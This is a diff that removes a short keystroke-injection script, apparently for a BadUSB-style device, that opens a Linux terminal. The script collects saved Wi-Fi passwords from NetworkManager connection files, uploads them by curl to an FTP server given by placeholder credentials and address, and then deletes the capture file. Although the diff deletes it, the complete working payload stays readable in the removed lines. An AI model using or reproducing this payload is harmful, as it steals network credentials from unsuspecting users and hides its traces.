@@ -1,6 +1,0 @@
-Delay 1000
-RunUnix gnome-terminal
-Delay 3000
-PrintLine cd /etc/NetworkManager/system-connections; grep psk= *|paste -sd,>~/capture.txt; cd ~; export xfile='capture.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; export xip='IPSERVERFTP'
-Delay 1000
-PrintLine curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}; rm capture.txt; exit
